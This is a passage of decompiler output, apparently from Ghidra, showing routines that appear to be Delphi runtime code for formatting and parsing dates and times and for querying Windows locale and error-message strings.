  undefined4 extraout_EDX_11;
  undefined4 extraout_EDX_12;
  byte bVar11;
  byte bVar12;
  undefined4 *puVar13;
  undefined4 *in_FS_OFFSET;
  undefined uVar14;
  undefined *puVar15;
  undefined4 uStack_40;
  undefined *puStack_3c;
  undefined *puStack_38;
  undefined4 *local_2c;
  undefined4 *local_28;
  byte local_23;
  char local_22;
  undefined local_21;
  ushort local_20;
  ushort local_1e;
  ushort local_1c;
  ushort local_1a;
  undefined local_17;
  ushort local_16;
  ushort local_14;
  ushort local_12;
  int local_10;
  byte local_9;
  undefined4 *local_8;
  
  puStack_38 = &stack0xfffffffc;
  local_2c = (undefined4 *)0x0;
  local_28 = (undefined4 *)0x0;
  puStack_3c = &LAB_00409795;
  uStack_40 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_40;
  local_8 = param_1;
  if ((param_1 != (undefined4 *)0x0) && (*(int *)(param_4 + -0x108) < 2)) {
    *(int *)(param_4 + -0x108) = *(int *)(param_4 + -0x108) + 1;
    local_17 = 0;
    local_21 = 0;
    local_22 = '\0';
    bVar12 = 0x20;
    local_8 = param_1;
    while (bVar1 = *(byte *)local_8, bVar1 != 0) {
      local_9 = bVar1;
      if ((*(byte *)((int)&DAT_00418110 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0) {
        puVar5 = (undefined4 *)FUN_0040b3d0((LPCSTR)local_8);
        bVar1 = local_9;
        if ((byte)(local_9 + 0x9f) < 0x1a) {
          bVar1 = local_9 - 0x20;
        }
        cVar10 = bVar1 + 0xa5;
        bVar11 = bVar12;
        if ((((byte)(bVar1 + 0xbf) < 0x1a) && (bVar11 = bVar1, bVar1 == 0x4d)) && (bVar12 == 0x48))
        {
          bVar1 = 0x4e;
          bVar11 = bVar1;
        }
        uVar2 = *(undefined *)(bVar1 + 0x4090d5);
        uVar7 = (undefined)extraout_ECX_00;
        bVar12 = bVar11;
        local_8 = puVar5;
        switch(bVar1) {
        case 0x22:
        case 0x27:
          uVar9 = extraout_ECX_00;
          while( true ) {
            bVar1 = *(byte *)local_8;
            if ((bVar1 == 0) || (bVar1 == local_9)) break;
            if ((*(byte *)((int)&DAT_00418110 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0) {
              local_8 = (undefined4 *)((int)local_8 + 1);
            }
            else {
              local_8 = (undefined4 *)FUN_0040b3d0((LPCSTR)local_8);
              uVar9 = extraout_ECX_13;
            }
          }
          FUN_00408c50(puVar5,(int)local_8 - (int)puVar5,uVar9,param_4);
          if (*(byte *)local_8 != 0) {
            local_8 = (undefined4 *)((int)local_8 + 1);
          }
          break;
        default:
          FUN_00408c50((undefined4 *)&local_9,1,extraout_ECX_00,param_4);
          break;
        case 0x2f:
          if (DAT_00419681 != '\0') {
            FUN_00408c50((undefined4 *)&DAT_00419681,1,extraout_ECX_00,param_4);
          }
          break;
        case 0x3a:
          if (DAT_0041968c != '\0') {
            FUN_00408c50((undefined4 *)&DAT_0041968c,1,extraout_ECX_00,param_4);
          }
          break;
        case 0x41:
          FUN_00408d64(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar5 = local_8;
          puVar13 = (undefined4 *)((int)local_8 + -1);
          iVar6 = FUN_00407a8c((char *)puVar13,s_AM_PM_004097a4,5);
          if (iVar6 == 0) {
            if (0xb < local_1a) {
              puVar13 = (undefined4 *)((int)puVar5 + 2);
            }
            FUN_00408c50(puVar13,2,extraout_ECX_07,param_4);
            local_22 = '\x01';
            local_8 = local_8 + 1;
          }
          else {
            iVar6 = FUN_00407a8c((char *)puVar13,&DAT_004097ac,3);
            if (iVar6 == 0) {
              if (0xb < local_1a) {
                puVar13 = (undefined4 *)((int)puVar5 + 1);
              }
              FUN_00408c50(puVar13,1,extraout_ECX_08,param_4);
              local_22 = '\x01';
              local_8 = (undefined4 *)((int)local_8 + 2);
            }
            else {
              iVar6 = FUN_00407a8c((char *)puVar13,&DAT_004097b0,4);
              if (iVar6 == 0) {
                if (local_1a < 0xc) {
                  FUN_00408c94(DAT_00419690,extraout_EDX_06,extraout_ECX_09,param_4);
                }
                else {
                  FUN_00408c94(DAT_00419694,extraout_EDX_06,extraout_ECX_09,param_4);
                }
                local_22 = '\x01';
                local_8 = (undefined4 *)((int)local_8 + 3);
              }
              else {
                iVar6 = FUN_00407a8c((char *)puVar13,&DAT_004097b8,4);
                if (iVar6 == 0) {
                  puVar8 = &stack0xfffffffc;
                  FUN_00408d2c(0,extraout_DL_07,extraout_CL,&stack0xfffffffc);
                  iVar6 = param_4;
                  uVar4 = FUN_00408bc4(param_4,extraout_EDX_07,puVar8,*(undefined4 *)(param_4 + 8),
                                       *(undefined4 *)(param_4 + 0xc));
                  FUN_00408c94(*(undefined4 **)(&DAT_00419718 + (uVar4 & 0xffff) * 4),
                               extraout_EDX_08,extraout_ECX_10,iVar6);
                  local_8 = (undefined4 *)((int)local_8 + 3);
                }
                else {
                  iVar6 = FUN_00407a8c((char *)puVar13,&DAT_004097c0,3);
                  if (iVar6 == 0) {
                    puVar8 = &stack0xfffffffc;
                    FUN_00408d2c(0,extraout_DL_08,(char)extraout_ECX_11,&stack0xfffffffc);
                    iVar6 = param_4;
                    uVar4 = FUN_00408bc4(param_4,extraout_EDX_09,puVar8,*(undefined4 *)(param_4 + 8)
                                         ,*(undefined4 *)(param_4 + 0xc));
                    FUN_00408c94(*(undefined4 **)(&DAT_004196fc + (uVar4 & 0xffff) * 4),
                                 extraout_EDX_10,extraout_ECX_12,iVar6);
                    local_8 = (undefined4 *)((int)local_8 + 2);
                  }
                  else {
                    FUN_00408c50((undefined4 *)&local_9,1,extraout_ECX_11,param_4);
                  }
                }
              }
            }
          }
          break;
        case 0x43:
          puVar8 = &stack0xfffffffc;
          FUN_00408d00(uVar2,cVar10,uVar7,&stack0xfffffffc);
          iVar6 = param_4;
          uVar2 = FUN_00409014(DAT_00419684,extraout_EDX_11,puVar8,param_4);
          puVar8 = &stack0xfffffffc;
          FUN_00408d64(uVar2,extraout_DL_09,(char)iVar6,&stack0xfffffffc);
          if (((local_1a != 0) || (local_1c != 0)) || (local_1e != 0)) {
            iVar6 = param_4;
            FUN_00408c50((undefined4 *)&DAT_004097c4,1,puVar8,param_4);
            FUN_00409014(DAT_0041969c,extraout_EDX_12,iVar6,param_4);
          }
          break;
        case 0x44:
          puVar8 = &stack0xfffffffc;
          FUN_00408d00(uVar2,cVar10,uVar7,&stack0xfffffffc);
          iVar6 = local_10 + -3;
          if (local_10 - 1U < 2) {
            puVar15 = &stack0xfffffffc;
            FUN_00408d2c((char)iVar6,(char)extraout_EDX_02,(char)puVar8,&stack0xfffffffc);
            FUN_00408cb4((uint)local_16,local_10,puVar15,param_4);
          }
          else if (iVar6 == 0) {
            iVar6 = param_4;
            uVar4 = FUN_00408bc4(param_4,extraout_EDX_02,puVar8,*(undefined4 *)(param_4 + 8),
                                 *(undefined4 *)(param_4 + 0xc));
            FUN_00408c94(*(undefined4 **)(&DAT_004196fc + (uVar4 & 0xffff) * 4),extraout_EDX_03,
                         extraout_ECX_01,iVar6);
          }
          else if (local_10 == 4) {
            iVar6 = param_4;
            uVar4 = FUN_00408bc4(param_4,extraout_EDX_02,puVar8,*(undefined4 *)(param_4 + 8),
                                 *(undefined4 *)(param_4 + 0xc));
            FUN_00408c94(*(undefined4 **)(&DAT_00419718 + (uVar4 & 0xffff) * 4),extraout_EDX_04,
                         extraout_ECX_02,iVar6);
          }
          else if (iVar6 == 2) {
            FUN_00409014(DAT_00419684,extraout_EDX_02,puVar8,param_4);
          }
          else {
            FUN_00409014(DAT_00419688,extraout_EDX_02,puVar8,param_4);
          }
          break;
        case 0x45:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00408d00(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar15 = &stack0xfffffffc;
          FUN_00408d2c(uVar2,extraout_DL_01,uVar14,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          iVar6 = param_4;
          FUN_00408f0c(local_10,(char **)&local_2c,puVar15,(int)&stack0xfffffffc);
          FUN_00408c94(local_2c,extraout_EDX_00,puVar8,iVar6);
          break;
        case 0x47:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00408d00(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar15 = &stack0xfffffffc;
          FUN_00408d2c(uVar2,extraout_DL_00,uVar14,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          iVar6 = param_4;
          FUN_00408da4(local_10,(int *)&local_28,puVar15,(int)&stack0xfffffffc);
          FUN_00408c94(local_28,extraout_EDX,puVar8,iVar6);
          break;
        case 0x48:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00408d00(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00408d64(uVar2,extraout_DL_03,uVar14,&stack0xfffffffc);
          local_23 = 0;
          puVar5 = local_8;
          while (bVar1 = *(byte *)puVar5, bVar1 != 0) {
            if ((*(byte *)((int)&DAT_00418110 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0) {
              bVar1 = *(byte *)puVar5;
              if (bVar1 < 0x49) {
                if (bVar1 == 0x48) break;
                if ((bVar1 == 0x22) || (bVar1 == 0x27)) {
                  local_23 = local_23 ^ 1;
                }
                else if (bVar1 == 0x41) goto LAB_00409386;
              }
              else if (bVar1 == 0x61) {
LAB_00409386:
                if (local_23 == 0) {
                  iVar6 = FUN_00407a8c((char *)puVar5,s_AM_PM_004097a4,5);
                  puVar8 = extraout_ECX_04;
                  if (((iVar6 == 0) ||
                      (iVar6 = FUN_00407a8c((char *)puVar5,&DAT_004097ac,3),
                      puVar8 = extraout_ECX_05, iVar6 == 0)) ||
                     (iVar6 = FUN_00407a8c((char *)puVar5,&DAT_004097b0,4), puVar8 = extraout_ECX_06
                     , iVar6 == 0)) {
                    local_22 = '\x01';
                  }
                  break;
                }
              }
              else if (bVar1 == 0x68) break;
              puVar5 = (undefined4 *)((int)puVar5 + 1);
            }
            else {
              puVar5 = (undefined4 *)FUN_0040b3d0((LPCSTR)puVar5);
              puVar8 = extraout_ECX_03;
            }
          }
          uVar3 = local_1a;
          if (local_22 != '\0') {
            if (local_1a == 0) {
              uVar3 = 0xc;
            }
            else if (0xc < local_1a) {
              uVar3 = local_1a - 0xc;
            }
          }
          if (2 < local_10) {
            local_10 = 2;
          }
          FUN_00408cb4((uint)uVar3,local_10,puVar8,param_4);
          break;
        case 0x4d:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00408d00(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00408d2c(uVar2,extraout_DL_02,uVar14,&stack0xfffffffc);
          if (local_10 - 1U < 2) {
            FUN_00408cb4((uint)local_14,local_10,puVar8,param_4);
          }
          else if (local_10 - 1U == 2) {
            FUN_00408c94((&DAT_0041969c)[local_14],extraout_EDX_01,puVar8,param_4);
          }
          else {
            FUN_00408c94(*(undefined4 **)(&DAT_004196cc + (uint)local_14 * 4),extraout_EDX_01,puVar8
                         ,param_4);
          }
          break;
        case 0x4e:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00408d00(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00408d64(uVar2,extraout_DL_04,uVar14,&stack0xfffffffc);
          if (2 < local_10) {
            local_10 = 2;
          }
          FUN_00408cb4((uint)local_1c,local_10,puVar8,param_4);
          break;
        case 0x53:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00408d00(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00408d64(uVar2,extraout_DL_05,uVar14,&stack0xfffffffc);
          if (2 < local_10) {
            local_10 = 2;
          }
          FUN_00408cb4((uint)local_1e,local_10,puVar8,param_4);
          break;
        case 0x54:
          puVar8 = &stack0xfffffffc;
          FUN_00408d00(uVar2,cVar10,uVar7,&stack0xfffffffc);
          if (local_10 == 1) {
            FUN_00409014(DAT_00419698,extraout_EDX_05,puVar8,param_4);
          }
          else {
            FUN_00409014(DAT_0041969c,extraout_EDX_05,puVar8,param_4);
          }
          break;
        case 0x59:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00408d00(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00408d2c(uVar2,extraout_DL,uVar14,&stack0xfffffffc);
          if (local_10 < 3) {
            FUN_00408cb4((uint)local_12 % 100,2,100,param_4);
          }
          else {
            FUN_00408cb4((uint)local_12,4,puVar8,param_4);
          }
          break;
        case 0x5a:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00408d00(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00408d64(uVar2,extraout_DL_06,uVar14,&stack0xfffffffc);
          if (3 < local_10) {
            local_10 = 3;
          }
          FUN_00408cb4((uint)local_20,local_10,puVar8,param_4);
        }
      }
      else {
        iVar6 = param_4;
        uVar4 = FUN_0040b3b0((LPCSTR)local_8);
        FUN_00408c50(local_8,uVar4,extraout_ECX,iVar6);
        local_8 = (undefined4 *)FUN_0040b3d0((LPCSTR)local_8);
        bVar12 = 0x20;
      }
    }
    *(int *)(param_4 + -0x108) = *(int *)(param_4 + -0x108) + -1;
  }
  *in_FS_OFFSET = uStack_40;
  puStack_38 = &LAB_0040979c;
  puStack_3c = (undefined *)0x409794;
  FUN_00404080((int *)&local_2c,2);
  return;
}



void FUN_004097c8(int *param_1,undefined4 *param_2,undefined4 param_3)

{
  undefined4 local_104 [64];
  
  if (param_2 == (undefined4 *)0x0) {
    FUN_00409014((undefined4 *)&DAT_00409820,0,param_3,(int)&stack0xfffffffc);
  }
  else {
    FUN_00409014(param_2,param_2,param_3,(int)&stack0xfffffffc);
  }
  FUN_0040414c(param_1,local_104,0);
  return;
}



void FUN_00409824(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  FUN_004097c8(param_1,(undefined4 *)0x0,param_3);
  return;
}



void FUN_00409838(int param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  
  iVar2 = *param_2;
  while( true ) {
    iVar1 = FUN_004042f8(param_1);
    if ((iVar1 < iVar2) || (*(char *)(param_1 + -1 + iVar2) != ' ')) break;
    iVar2 = iVar2 + 1;
  }
  *param_2 = iVar2;
  return;
}



bool FUN_0040985c(int param_1,int *param_2,ushort *param_3,char *param_4)

{
  ushort uVar1;
  int iVar2;
  int iVar3;
  
  *param_4 = '\0';
  FUN_00409838(param_1,param_2);
  iVar3 = *param_2;
  uVar1 = 0;
  while( true ) {
    iVar2 = FUN_004042f8(param_1);
    if (((iVar2 < iVar3) || (9 < (byte)(*(char *)(param_1 + -1 + iVar3) - 0x30U))) || (999 < uVar1))
    break;
    uVar1 = uVar1 * 10 + (*(byte *)(param_1 + -1 + iVar3) - 0x30);
    iVar3 = iVar3 + 1;
  }
  iVar2 = *param_2;
  if (iVar2 < iVar3) {
    *param_4 = (char)iVar3 - (char)*param_2;
    *param_2 = iVar3;
    *param_3 = uVar1;
  }
  return iVar2 < iVar3;
}



void FUN_004098f0(int param_1,int *param_2,undefined *param_3)

{
  uint uVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined **ppuVar3;
  undefined4 uStack_24;
  undefined *puStack_20;
  undefined *puStack_1c;
  undefined *local_c;
  int local_8;
  
  puStack_1c = &stack0xfffffffc;
  local_c = (undefined *)0x0;
  puStack_20 = &LAB_00409969;
  uStack_24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_24;
  local_8 = param_1;
  if (param_3 != (undefined *)0x0) {
    FUN_00409838(param_1,param_2);
    ppuVar3 = &local_c;
    uVar1 = FUN_004042f8((int)param_3);
    FUN_00404558(local_8,*param_2,uVar1,(int *)ppuVar3);
    iVar2 = FUN_00407170(param_3,local_c);
    if (iVar2 == 0) {
      iVar2 = FUN_004042f8((int)param_3);
      *param_2 = *param_2 + iVar2;
    }
  }
  *in_FS_OFFSET = uStack_24;
  puStack_1c = &LAB_00409970;
  puStack_20 = (undefined *)0x409968;
  FUN_0040405c((int *)&local_c);
  return;
}



undefined4 FUN_0040997c(int param_1,int *param_2,char param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  uVar2 = 0;
  FUN_00409838(param_1,param_2);
  iVar1 = FUN_004042f8(param_1);
  if ((*param_2 <= iVar1) && (*(char *)(param_1 + -1 + *param_2) == param_3)) {
    *param_2 = *param_2 + 1;
    uVar2 = 1;
  }
  return uVar2;
}



undefined4 FUN_004099b4(int param_1)

{
  byte bVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = 1;
  while( true ) {
    iVar2 = FUN_004042f8(param_1);
    if (iVar2 < iVar3) {
      return 0;
    }
    bVar1 = *(byte *)(param_1 + -1 + iVar3) & 0xdf;
    if (bVar1 == 0x44) {
      return 1;
    }
    if (bVar1 == 0x45) {
      return 2;
    }
    if (bVar1 == 0x4d) break;
    if (bVar1 == 0x59) {
      return 2;
    }
    iVar3 = iVar3 + 1;
  }
  return 0;
}



int FUN_00409a00(undefined *param_1,int *param_2)

{
  int iVar1;
  
  while( true ) {
    iVar1 = FUN_004042f8((int)param_1);
    if ((iVar1 < *param_2) ||
       (iVar1 = CONCAT31((int3)((uint)*param_2 >> 8),param_1[*param_2 + -1] + -0x3a),
       (byte)(param_1[*param_2 + -1] - 0x30) < 10)) break;
    if ((*(byte *)((int)&DAT_00418110 + ((int)(uint)(byte)param_1[*param_2 + -1] >> 3)) >>
         ((byte)param_1[*param_2 + -1] & 7) & 1) == 0) {
      *param_2 = *param_2 + 1;
    }
    else {
      iVar1 = FUN_0040b414(param_1,*param_2);
      *param_2 = iVar1;
    }
  }
  return iVar1;
}



undefined4 FUN_00409a48(undefined *param_1)

{
  char *pcVar1;
  byte *pbVar2;
  PCNZCH pCVar3;
  int *piVar4;
  undefined4 *puVar5;
  int iVar6;
  
  iVar6 = 7;
  piVar4 = &DAT_00419748;
  puVar5 = &DAT_00419764;
  while( true ) {
    if (*piVar4 == 0) {
      return 0;
    }
    pcVar1 = FUN_004044f8(param_1);
    pbVar2 = FUN_004044f8((undefined *)*piVar4);
    pCVar3 = FUN_0040b4cc(pbVar2,pcVar1);
    if (pCVar3 != (PCNZCH)0x0) break;
    puVar5 = puVar5 + 1;
    piVar4 = piVar4 + 1;
    iVar6 = iVar6 + -1;
    if (iVar6 == 0) {
      return 0;
    }
  }
  return *puVar5;
}



int FUN_00409a9c(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  WORD WVar1;
  uint uVar2;
  
  if (DAT_0041973c == 0x12) {
    if (param_1 < 100) {
      WVar1 = FUN_00408c3c();
      uVar2 = (int)*(uint *)(param_4 + -4) >> 0x1f;
      param_1 = param_1 + ((int)((uint)WVar1 + ((*(uint *)(param_4 + -4) ^ uVar2) - uVar2)) / 100) *
                          100;
    }
    if (0 < *(int *)(param_4 + -4)) {
      *(int *)(param_4 + -4) = -*(int *)(param_4 + -4);
    }
  }
  else {
    *(int *)(param_4 + -4) = *(int *)(param_4 + -4) + -1;
  }
  return *(int *)(param_4 + -4) + param_1;
}



void FUN_00409af8(undefined *param_1,int *param_2,double *param_3)

{
  bool bVar1;
  WORD WVar2;
  undefined4 uVar3;
  PCNZCH pCVar4;
  undefined2 extraout_var;
  char *pcVar5;
  int iVar6;
  uint uVar7;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  ushort uVar8;
  uint uVar9;
  undefined4 *in_FS_OFFSET;
  undefined **ppuVar10;
  undefined4 uStack_44;
  undefined *puStack_40;
  undefined *puStack_3c;
  undefined *local_2c;
  undefined *local_28;
  int local_24;
  undefined *local_20;
  byte local_1c;
  byte local_1b;
  char local_1a;
  byte local_19;
  ushort local_18;
  ushort local_16;
  ushort local_14;
  ushort local_12;
  ushort local_10;
  char local_e;
  undefined local_d;
  double *local_c;
  int local_8;
  
  puStack_3c = &stack0xfffffffc;
  local_2c = (undefined *)0x0;
  local_28 = (undefined *)0x0;
  local_24 = 0;
  local_20 = (undefined *)0x0;
  puStack_40 = &LAB_00409e13;
  uStack_44 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_44;
  uVar9 = 0;
  local_16 = 0;
  local_18 = 0;
  local_1c = 0;
  local_d = 0;
  local_c = param_3;
  uVar3 = FUN_004099b4((int)DAT_00419684);
  local_e = (char)uVar3;
  local_8 = 0;
  if ((DAT_00419684 == (char *)0x0) || (*DAT_00419684 != 'g')) {
    pCVar4 = FUN_0040b494(&DAT_00409e2c,DAT_00419684);
    if (0 < (int)pCVar4) {
      local_8 = DAT_00419764;
    }
  }
  else {
    FUN_00409a00(param_1,param_2);
    FUN_00404558((int)param_1,1,*param_2 - 1,&local_24);
    FUN_004071c0(local_24,(int *)&local_20);
    local_8 = FUN_00409a48(local_20);
  }
  bVar1 = FUN_0040985c((int)param_1,param_2,&local_10,(char *)&local_19);
  if (((bVar1) && (uVar3 = FUN_0040997c((int)param_1,param_2,DAT_00419681), (char)uVar3 != '\0')) &&
     (bVar1 = FUN_0040985c((int)param_1,param_2,&local_12,&local_1a), bVar1)) {
    uVar3 = FUN_0040997c((int)param_1,param_2,DAT_00419681);
    if ((char)uVar3 == '\0') {
      WVar2 = FUN_00408c3c();
      uVar9 = CONCAT22(extraout_var,WVar2);
      if (local_e == '\x01') {
        local_18 = local_10;
        local_16 = local_12;
      }
      else {
        local_16 = local_10;
        local_18 = local_12;
      }
    }
    else {
      bVar1 = FUN_0040985c((int)param_1,param_2,&local_14,(char *)&local_1b);
      if (!bVar1) goto LAB_00409df8;
      if (local_e == '\0') {
        uVar9 = (uint)local_14;
        local_1c = local_1b;
        local_16 = local_10;
        local_18 = local_12;
      }
      else if (local_e == '\x01') {
        uVar9 = (uint)local_14;
        local_1c = local_1b;
        local_16 = local_12;
        local_18 = local_10;
      }
      else if (local_e == '\x02') {
        uVar9 = (uint)local_10;
        local_1c = local_19;
        local_16 = local_12;
        local_18 = local_14;
      }
      if (local_8 < 1) {
        if (local_1c < 3) {
          WVar2 = FUN_00408c3c();
          uVar8 = (short)uVar9 + (short)((int)((uint)WVar2 - (uint)DAT_004180dc) / 100) * 100;
          uVar9 = (uint)uVar8;
          if ((DAT_004180dc != 0) && ((int)(uint)uVar8 < (int)((uint)WVar2 - (uint)DAT_004180dc))) {
            uVar9 = (uint)(ushort)(uVar8 + 100);
          }
        }
      }
      else {
        uVar9 = FUN_00409a9c(uVar9,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
      }
    }
    FUN_0040997c((int)param_1,param_2,DAT_00419681);
    FUN_00409838((int)param_1,param_2);
    if ((DAT_00419744 != '\0') &&
       (pcVar5 = FUN_004045e0(&DAT_00409e38,DAT_00419684), pcVar5 != (char *)0x0)) {
      if ((byte)(*DAT_00419698 - 0x30U) < 10) {
        FUN_00409a00(param_1,param_2);
      }
      else {
        do {
          while ((iVar6 = FUN_004042f8((int)param_1), *param_2 <= iVar6 &&
                 (param_1[*param_2 + -1] != ' '))) {
            *param_2 = *param_2 + 1;
          }
          FUN_00409838((int)param_1,param_2);
          iVar6 = FUN_004042f8((int)param_1);
          if (iVar6 < *param_2) break;
          ppuVar10 = &local_28;
          uVar7 = FUN_004042f8((int)DAT_00419690);
          FUN_00404558((int)param_1,*param_2,uVar7,(int *)ppuVar10);
          iVar6 = FUN_00407170(DAT_00419690,local_28);
          if (iVar6 == 0) break;
          ppuVar10 = &local_2c;
          uVar7 = FUN_004042f8((int)DAT_00419694);
          FUN_00404558((int)param_1,*param_2,uVar7,(int *)ppuVar10);
          iVar6 = FUN_00407170(DAT_00419694,local_2c);
        } while (iVar6 != 0);
      }
    }
    local_d = FUN_00408960(uVar9,local_16,local_18,local_c);
  }
LAB_00409df8:
  *in_FS_OFFSET = uStack_44;
  puStack_3c = &LAB_00409e1a;
  puStack_40 = (undefined *)0x409e12;
  FUN_00404080((int *)&local_2c,4);
  return;
}



undefined4 FUN_00409e3c(int param_1,int *param_2,double *param_3)

{
  char cVar1;
  bool bVar2;
  undefined4 uVar3;
  int iVar4;
  ushort local_1c;
  ushort local_1a;
  ushort local_18;
  ushort local_16;
  char local_14 [4];
  
  iVar4 = -1;
  cVar1 = FUN_004098f0(param_1,param_2,DAT_00419690);
  if ((cVar1 == '\0') && (cVar1 = FUN_004098f0(param_1,param_2,&DAT_0040a020), cVar1 == '\0')) {
    cVar1 = FUN_004098f0(param_1,param_2,DAT_00419694);
    if ((cVar1 != '\0') || (cVar1 = FUN_004098f0(param_1,param_2,&DAT_0040a02c), cVar1 != '\0')) {
      iVar4 = 0xc;
    }
  }
  else {
    iVar4 = 0;
  }
  if (-1 < iVar4) {
    FUN_00409838(param_1,param_2);
  }
  bVar2 = FUN_0040985c(param_1,param_2,&local_1c,local_14);
  if (!bVar2) {
    return 0;
  }
  local_1a = 0;
  local_18 = 0;
  local_16 = 0;
  uVar3 = FUN_0040997c(param_1,param_2,DAT_0041968c);
  if ((char)uVar3 != '\0') {
    bVar2 = FUN_0040985c(param_1,param_2,&local_1a,local_14);
    if (!bVar2) {
      return 0;
    }
    uVar3 = FUN_0040997c(param_1,param_2,DAT_0041968c);
    if ((char)uVar3 != '\0') {
      bVar2 = FUN_0040985c(param_1,param_2,&local_18,local_14);
      if (!bVar2) {
        return 0;
      }
      uVar3 = FUN_0040997c(param_1,param_2,DAT_0041967f);
      if (((char)uVar3 != '\0') &&
         (bVar2 = FUN_0040985c(param_1,param_2,&local_16,local_14), !bVar2)) {
        return 0;
      }
    }
  }
  if (iVar4 < 0) {
    cVar1 = FUN_004098f0(param_1,param_2,DAT_00419690);
    if ((cVar1 == '\0') && (cVar1 = FUN_004098f0(param_1,param_2,&DAT_0040a020), cVar1 == '\0')) {
      cVar1 = FUN_004098f0(param_1,param_2,DAT_00419694);
      if ((cVar1 != '\0') || (cVar1 = FUN_004098f0(param_1,param_2,&DAT_0040a02c), cVar1 != '\0')) {
        iVar4 = 0xc;
      }
    }
    else {
      iVar4 = 0;
    }
  }
  if (-1 < iVar4) {
    if (local_1c == 0) {
      return 0;
    }
    if (0xc < local_1c) {
      return 0;
    }
    if (local_1c == 0xc) {
      local_1c = 0;
    }
    local_1c = local_1c + (short)iVar4;
  }
  FUN_00409838(param_1,param_2);
  uVar3 = FUN_00408818(local_1c,local_1a,local_18,param_3,local_16);
  return uVar3;
}



undefined4 FUN_0040a030(int param_1,double *param_2)

{
  undefined4 uVar1;
  int iVar2;
  int local_c;
  
  local_c = 1;
  uVar1 = FUN_00409e3c(param_1,&local_c,param_2);
  if (((char)uVar1 != '\0') && (iVar2 = FUN_004042f8(param_1), iVar2 < local_c)) {
    return CONCAT31((int3)((uint)iVar2 >> 8),1);
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0040a064(undefined *param_1,double *param_2)

{
  char cVar1;
  int iVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 unaff_EBX;
  int local_24 [2];
  double local_1c;
  undefined4 local_14;
  undefined4 uStack_10;
  
  uVar4 = CONCAT31((int3)((uint)unaff_EBX >> 8),1);
  local_24[0] = 1;
  local_14 = 0;
  uStack_10 = 0;
  cVar1 = FUN_00409af8(param_1,local_24,&local_1c);
  if (cVar1 == '\0') {
LAB_0040a0af:
    uVar4 = FUN_0040a030((int)param_1,param_2);
  }
  else {
    iVar2 = FUN_004042f8((int)param_1);
    if (local_24[0] <= iVar2) {
      uVar3 = FUN_00409e3c((int)param_1,local_24,(double *)&local_14);
      if ((char)uVar3 == '\0') goto LAB_0040a0af;
    }
    if (local_1c < (double)_DAT_0040a0ec) {
      *param_2 = local_1c - (double)CONCAT44(uStack_10,local_14);
    }
    else {
      *param_2 = local_1c + (double)CONCAT44(uStack_10,local_14);
    }
  }
  return uVar4;
}



void FUN_0040a0f0(DWORD param_1,int *param_2)

{
  byte bVar1;
  uint uVar2;
  undefined4 local_104 [64];
  
  uVar2 = FormatMessageA(0x3200,(LPCVOID)0x0,param_1,0,(LPSTR)local_104,0x100,(va_list *)0x0);
  for (; (0 < (int)uVar2 &&
         ((bVar1 = *(byte *)((int)local_104 + (uVar2 - 1)), bVar1 < 0x21 || (bVar1 == 0x2e))));
      uVar2 = uVar2 - 1) {
  }
  FUN_0040414c(param_2,local_104,uVar2);
  return;
}



void FUN_0040a13c(LCID param_1,LCTYPE param_2,undefined4 *param_3,int *param_4)

{
  int iVar1;
  undefined4 local_104 [64];
  
  iVar1 = GetLocaleInfoA(param_1,param_2,(LPSTR)local_104,0x100);
  if (iVar1 < 1) {
    FUN_004040b0(param_4,param_3);
  }
  else {
    FUN_0040414c(param_4,local_104,iVar1 - 1);
  }
  return;
}



uint FUN_0040a188(LCID param_1,LCTYPE param_2,uint param_3)

{
  int iVar1;
  uint local_10;
  
  local_10 = param_3;
  iVar1 = GetLocaleInfoA(param_1,param_2,(LPSTR)&local_10,2);
  if (0 < iVar1) {
    param_3 = CONCAT31((int3)((uint)iVar1 >> 8),(undefined)local_10);
  }
  return param_3;
}



void FUN_0040a1b0(LCTYPE param_1,int param_2,int param_3,int *param_4,undefined4 param_5,int param_6
                 )

{
  FUN_0040a13c(*(LCID *)(param_6 + -4),param_1,(undefined4 *)0x0,param_4);
  if (*param_4 == 0) {
    FUN_00405ac0(*(int ***)(param_3 + param_2 * 4),param_4);
  }
  return;
}



void FUN_0040a1ec(void)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_34;
